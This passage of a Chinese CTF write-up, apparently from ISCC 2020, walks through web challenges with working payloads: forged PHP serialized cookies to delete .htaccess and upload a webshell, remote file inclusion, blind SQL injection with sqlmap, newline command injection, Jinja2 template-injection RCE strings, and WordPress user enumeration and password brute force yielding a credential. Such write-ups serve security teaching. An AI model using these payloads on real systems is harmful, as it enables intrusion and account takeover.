";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";`}`i:1;O:10:"UploadFile":2:`{`s:8:"fakename";s:253:"
```

因为我们必须先修改第二个对象的fakename值，然后才能依据重新反序列化的Cooke[files]修改第一个的fakename，而此时的第二个fakename长度已经改变，不再是7，所以这部分溢出的长度为117，因此第一个文件的fakename值就是117个`../`。

```
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
```

**最终payload**

依据上述的分析，先修改第二个文件对象的fakename然后再修改第一个文件对象的fakename(不能互换！！！)

第二个文件对象的fakename:

```
";s:8:"realname";s:1:"A";`}`i:1;O:10:"ZipArchive":7:`{`s:8:"fakename";s:58:"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"
```

第一个文件对象的fakename:

```
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
```

修改伪造之后成功伪造引入非法对象的Cookie

```
a:2:`{`i:0;O:10:"UploadFile":2:`{`s:8:"fakename";s:351:"./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";`}`i:1;O:10:"UploadFile":2:`{`s:8:"fakename";s:253:"";s:8:"realname";s:1:"A";`}`i:1;O:10:"ZipArchive":7:`{`s:8:"fakename";s:58:"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"";s:8:"realname";s:44:"75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg";`}``}`cc2ffa6941ffc8895e4c029f62046ab7963af6ec9e5061103d71a295834b388b
```

查看非法对象Cookie中files的文件对象数组

```
php &gt; print_r(unserialize($X));
Array 
(   
    [0] =&gt; __PHP_Incomplete_Class Object 
        (  
            [__PHP_Incomplete_Class_Name] =&gt; UploadFile   
            [fakename] =&gt; ./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";`}`i:1;O:10:"UploadFile":2:`{`s:8:"fakename";s:253:" 
            [realname] =&gt; A     
        )        
    [1] =&gt; ZipArchive Object
        ( 
            [status] =&gt; 0   
            [statusSys] =&gt; 0  
            [numFiles] =&gt; 0     
            [filename] =&gt; 
            [comment] =&gt; 
            [fakename] =&gt; sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess
            [realname] =&gt; 9   
        )  
)
```

最后访问`index.php?action=open&amp;i=1`，服务器直接操作files数组中i=1索引的对象执行open()方法，即ZipArchive的open函数，删除`.htaccess`文件。

之后，直接上传webshell拿到服务器权限

```
shell.php is in folder sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/cf9c5d4cdaab48d9872f7029d1cd642431e58193.php
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01121875daaeaad157.png)

```
flag`{`ghs_aswoer_nmxld`}`
```

### <a class="reference-link" name="Where%20is%20file?"></a>Where is file?

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016fb191f63c3cbc63.png)

考点：文件包含

题目源码直接给了

```
&lt;?php
show_source(__FILE__);
echo $_GET['hello'];
$file=$_GET['file'];
while (strstr($file, "file://")) `{`
    $file=str_replace("file://", "", $file);
`}`
include($file);
?
```

代码审计`file`变量用户可控存在文件包含漏洞

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01911fbde2d572e8cf.png)

测试发现本地文件包含漏洞无法进行恶意利用（服务器访问日志、SSH日志等无法直接访问包含），直接猜测测试是否存在远程文件包含漏洞（随便找一个其他题目链接，意外发现成功包含【第一次CTF遇见远程文件包含。。。。尴尬。。。】）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016b1d10d800ec1bb1.png)

到这里不用说了，直接远程包含恶意文件拿到Webshell

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e7f4edcaca0726e1.png)

这里也可以查看服务器的php.ini配置

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ecee7bf364db6368.png)

```
flag`{`web_include_file`}`
```

### <a class="reference-link" name="%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-2"></a>成绩查询-2

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01462631ad3249fc19.png)

考点：敏感信息收集、SQL注入

题目打开之后是一个登陆界面

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015da3cad5c8196324.png)

测试查看任意账户密码登录回显信息（不管用户名、密码是什么都会报错：`password is error！`）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01cd283ca0b68f2a7b.png)

简单注入`username`和`password`无果，到这里先不再继续注入，寻找网站是否存在其它的敏感信息泄露

收集网站敏感信息，发现存在特殊目录和文件的泄露

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e02084762f4795e2.png)

`inc`目录存放的是配置文件和功能函数文件

```
Index of /inc
[ICO]    Name    Last modified    Size    Description
[PARENTDIR]    Parent Directory         -     
[   ]    config.inc.php    2020-05-11 01:59    697     
[   ]    function.php    2020-04-28 12:44    7.1K     
[   ]    mysql.inc.php    2020-05-07 02:46    1.0K     
Apache/2.4.29 (Ubuntu) Server at 101.201.126.95 Port 7007
```

接着访问`flag.php`，发现存在跳转，使用bp拦截数据包

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0128dd2692adb4b814.png)

根据返回的数据包提示注入字段`name`

经过注入测试发现存在时间盲注，但是过滤了空格（这里使用注释符绕过）

payload（这里禁用JS之后再进行测试，避免跳转到index.php界面）

```
1'/**/AND/**/(SELECT/**/6/**/FROM/**/(SELECT(SLEEP(5)))B)#
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f8edd315741faf68.png)

知道注入规则之后，直接使用SQLMAP添加tamper脚本进行自动化攻击利用

```
sqlmap -u "http://101.201.126.95:7007/flag.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --tamper=space2comment -D pikachu -T flag -C "flag" --dump
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0186598de2322e19a6.png)

得到MD5进行解密

```
ciphertext：67d4e5f7ee18967a612a5eb8dcda020a

plaintext：sixsixsix

flag`{`sixsixsix`}`
```

### <a class="reference-link" name="%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-3"></a>成绩查询-3

[![](https://p1.ssl.qhimg.com/t017acf3aa2bea090be.png)](https://p1.ssl.qhimg.com/t017acf3aa2bea090be.png)

考点：密码算法

题目打开如下

[![](https://p1.ssl.qhimg.com/t01734a2fdc08876b4c.png)](https://p1.ssl.qhimg.com/t01734a2fdc08876b4c.png)

可以看到这是一串base64编码的字符串，但是解码之后是乱码

[![](https://p2.ssl.qhimg.com/t01c6493043ab91fb5e.png)](https://p2.ssl.qhimg.com/t01c6493043ab91fb5e.png)

可以猜测该字符串在base64编码之前可能进行过其它算法的的处理（一般算法加密的数据最后都会进行base64编码存储，避免特殊字符的影响），下来对网站进行敏感信息的收集，发现并未存在其它目录文件的泄露，但是网站主页的源代码里存在注释的源码敏感信息

[![](https://p0.ssl.qhimg.com/t013299025958ac7352.png)](https://p0.ssl.qhimg.com/t013299025958ac7352.png)

从代码可以看出这是一个加密算法，也就验证了主页显示的一串字符串正是由该算法加密处理后的结果。

既然知道了加密算法，就可以很容易的推出解密算法来，但是要想解密这段特殊字符串必须知道密钥key，由于前面的敏感信息收集并没有发现key的泄露，所以根据题目的关联性，回到上一关`ISCC成绩查询_2`（一般上一关flag会是下一关解题的一部分）寻找是否存在key，因为上一关注入得到的flag为`flag`{`sixsixsix`}``，所以猜测key可能取值为`sixsixsix 或 666`，知道密钥key之后剩下的就是由加密算法编写解密算法，解密算法如下：

```
&lt;?php

function decrypt($data, $key) `{`
    echo "n".$key.'：';
    $key = md5 ( $key );
    $x = 0;
    $data = base64_decode ( $data );
    $len = strlen ( $data );
    $l = strlen ( $key );
    for($i = 0; $i &lt; $len; $i ++) `{`
        if ($x == $l) `{`
            $x = 0;
        `}`
        $char .= substr ( $key, $x, 1 );
        $x ++;
    `}`
    for($i = 0; $i &lt; $len; $i ++) `{`
        if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) `{`
            $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) );
        `}` else `{`
            $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) );
        `}`
    `}`
    echo $str;
`}`

$key1 = "sixsixsix";
$key2 = "666";

$c = "qKe4j6uFeqaTe5rVqqaXiKig25o=";

decrypt($c, $key1);
decrypt($c, $key2);

?&gt;
```

解密数据`qKe4j6uFeqaTe5rVqqaXiKig25o=`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0198e830f4f91e909f.png)

从结果可以看到密钥key为`666`，解密结果为`BFS_ISCC_First_Prize`

```
flag`{`BFS_ISCC_First_Prize`}`
```

### <a class="reference-link" name="%E7%A5%9E%E7%A7%98%E7%BB%84%E7%BB%87%E7%9A%84%E9%82%AE%E4%BB%B6-2"></a>神秘组织的邮件-2

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0181ddb79c9a159eec.png)

考点：脚本编写、代码审计

题目打开有一串数字字符还有一个提交按钮

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0181cf5e2dcc64628c.png)

看数字和Result提交，猜测是计算上面的四个数然后提交结果，但是应该是什么样的四则运算呢？？依据上一题`神秘组织的邮件-1`解出的flag提示进行解题：`flag`{`加减乘除`}``

知道表达式的运算规则之后，编写脚本进行测试利用

```
import re
import requests
url='http://101.201.126.95:7010/index.php'
r = requests.session()
text = r.get(url).text
calc = str(re.findall('(.*?)&lt;form action="result.php" method="post"&gt;', text))[2:-2]
#print(text)
#print(calc)
s1 = calc.replace('  ', '+', 1)
s2 = s1.replace('  ', '-', 1)
s3 = s2.replace('  ', '*', 1)
s4 = s3.replace('  ', '/', 1)
print(s4)
ans = eval(s4)
print(ans)
data = `{`'result':ans, 'submit':'提交'`}`
url1 = 'http://101.201.126.95:7010/result.php'
res = r.post(url1, data=data)
print(res.text)
print(res.headers)
print(res.status_code)
```

运行脚本得到页面的其它回显信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01423430e505a8155d.png)

```
34685+95037-7*786/2
126971.0

&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;download&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
?&gt;
    &lt;a href="/IS20CC20abc%$.txt" download&gt;下载文件&lt;/a&gt;

&lt;/body&gt;
&lt;/html&gt;
```

从认证回显结果可以看到有一个txt文件可以下载，尝试访问得到部分源码（这里有一个坑！！！，不能直接访问`IS20CC20abc%$.txt`，需要对`%$`进行URL编码，不然会报404错误`Your browser sent a request that this server could not understand`）

正确的URL访问如下：

```
http://101.201.126.95:7010/IS20CC20abc%25%24.txt
```

`IS20CC20abc%$.txt`：

```
$pp = trim(base64_decode($result));
if ($pp === 'flag.php') `{`
    header ( "Location: ./flag.php" );
```

审计部分代码可知，需要变量`$result`值经过base64解码之后等于字符串`flag.php`

base64编码字符串`flag.php` —&gt;&gt; `ZmxhZy5waHA=`

继续回到主页面，提交`ZmxhZy5waHA=`，可是发现页面并没有跳转到`./flag.php`，猜测存在过滤，对`ZmxhZy5waHA=`进行改写绕过过滤：`Z'm'x'h'Z'y'5'w'a'H'A'=`

回到主页面提交特定字符串跳转到`./flag.php`得到flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d459ee4e805b11b3.png)

```
flag`{`welcomekenan`{`toiscc`}``}`
```

### <a class="reference-link" name="%E9%98%BF%E5%B8%85%E7%9A%84%E7%88%B1%E6%83%85"></a>阿帅的爱情

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011c19865d9f58eed2.png)

考点：命令注入

题目直接给了源码让进行审计，如下：

```
&lt;?php
if(!isset($_GET["ip"]))`{`
    show_source(__file__);
`}` else
`{`
    $ip=$_GET["ip"];
    $pattern="/[;|&amp;].*[a-zA-Z]+/";
    if(preg_match($pattern,$ip)!=0)`{`
        die('bad domain');
    `}`
    try `{`
        $result = shell_exec('ping -c 4 ' . $ip);
    `}`
    catch(Exception $e) `{`
        $result = $e-&gt;getMessage();
        echo $result;
    `}`
    $result = str_replace("n", "&lt;br&gt;", $result);
    echo $result;
`}`
```

审计可得变量`ip`存在注入，但是代码对`ip`变量进行了特殊字符与字母的过滤

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014348c1063a11b473.png)

这里因为是`shell_exec`函数并且正则对特殊字符进行了过滤，所以可以使用换行符`%0a`进行截断绕过限制

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013f3ddebc2ec51ceb.png)

通过审计绕过限制之后直接命令注入执行读取flag文件

```
?ip=127.0.0.1 %0acat flag.php
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01402f8f2a6b12884c.png)

```
flag`{`6Zi/5qOu5LiK5LqG6Zi_5biF77yM5Zyo5LiA5Liq5rKh5py_J5pif5pif55qE5aSc5pma`}`
```

## 擂台题-Web

### <a class="reference-link" name="Easy%20Injection"></a>Easy Injection

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01de7d817a23c89f25.png)

考点：jinja2模板注入

题目提示python模板注入

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010896f8c3276b5180.png)

典型的模板注入案例，没有过滤，直接构造利用payload

```
http://101.201.126.95:7050/`{`% for c in [].__class__.__base__.__subclasses__() %`}``{`% if c.__name__=='catch_warnings' %`}``{``{` c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /usr/src/app/flog').read()") `}``}``{`% endif %`}``{`% endfor %`}`

http://101.201.126.95:7050/`{``{` config.__class__.__init__.__globals__['os'].popen('cat flog').read() `}``}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01cdcabab015a20417.png)

**附题目源码**
- index.py
```
#encoding:utf-8
from flask import Flask,request,render_template_string
import urllib.request,urllib.parse
app = Flask(__name__)
@app.route("/")
def hello():
    return "python template injection"

@app.errorhandler(404)
def page_not_found(error):
    url = urllib.parse.unquote(request.url)
    return render_template_string("&lt;h1&gt;URL %s not found&lt;/h1&gt;&lt;br/&gt;"% url), 404

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=80)
```

### <a class="reference-link" name="%E7%AE%80%E7%AE%80%E5%8D%95%E5%8D%95%EF%BC%8C%E5%B9%B2%E6%8E%89WP"></a>简简单单，干掉WP

[![](https://p3.ssl.qhimg.com/t01d2a4d356ccf450e2.png)](https://p3.ssl.qhimg.com/t01d2a4d356ccf450e2.png)

考点：渗透测试

题目打开是一个大家所熟悉的CMS框架Wordpress站点

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010dfa70a96e4b56cd.png)

先查看WP版本：访问`readme.html`或使用`wpscan`进行扫描探测

```
→ Qftm :~/Desktop# wpscan --url http://94.191.116.98:64555/
_______________________________________________________________
         __          _______   _____
                  / /  __  / ____|
             /  / /| |__) | (___   ___  __ _ _ __ ®
            /  / / |  ___/ ___  / __|/ _` | '_ 
              /  /  | |     ____) | (__| (_| | | | |
             /  /   |_|    |_____/ ___|__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.6

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...

[i] Update completed.

[+] URL: http://94.191.116.98:64555/
[+] Started: Fri May  8 22:38:46 2020

Interesting Finding(s):

[+] http://94.191.116.98:64555/
 | Interesting Entries:
 |  - Server: nginx/1.17.10
 |  - X-Powered-By: PHP/7.2.30
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://94.191.116.98:64555/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] http://94.191.116.98:64555/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://94.191.116.98:64555/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://94.191.116.98:64555/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Latest, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://94.191.116.98:64555/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;
 |  - http://94.191.116.98:64555/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;

[+] WordPress theme in use: twentyseventeen
 | Location: http://94.191.116.98:64555/wp-content/themes/twentyseventeen/
 | Latest Version: 2.3 (up to date)
 | Last Updated: 2020-03-31T00:00:00.000Z
 | Readme: http://94.191.116.98:64555/wp-content/themes/twentyseventeen/readme.txt
 | Style URL: http://94.191.116.98:64555/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Aggressive Detection)
 |  - http://94.191.116.98:64555/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 &lt;=========================&gt; (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Fri May  8 22:42:30 2020
[+] Requests Done: 70
[+] Cached Requests: 3
[+] Data Sent: 14.687 KB
[+] Data Received: 15.181 MB
[+] Memory used: 178.301 MB
[+] Elapsed time: 00:03:44
```

访问`http://94.191.116.98:64555/robots.txt`得到后台页面

```
http://94.191.116.98:64555/wp-login.php
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01839a9ffb6a2a2c1c.png)

想办法登录网站，使用`wpscan`探测网站有哪些用户

```
wpscan --url http://94.191.116.98:64555 -e u
```

```
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://94.191.116.98:64555/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

探测到存在`admin和jerry`两个网站用户，将用户存储在文件`user`中

下来使用`cewl`根据网站生成破解密码`pass`

```
cewl http://94.191.116.98:64555/ -w pass
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01bbed3bd3fb146c82.png)

通过`wpscan`利用生成的user和pass两个文件进行破解验证后台

```
wpscan --url http://94.191.116.98:64555 -U user -P pass
```

```
[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 &lt;===============================&gt; (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - jerry / egIsNNNnotHe                                                                            
Trying admin / Author Time: 00:00:02 &lt;==================================&gt; (106 / 106) 100.00% Time: 00:00:02

[i] Valid Combinations Found:
 | Username: jerry, Password: egIsNNNnotHe
```

验证结果得到网站后台一组用户名和密码

```
Username: jerry, Password: egIsNNNnotHe
```

使用得到的账户名和密码登录后台，拿到flag

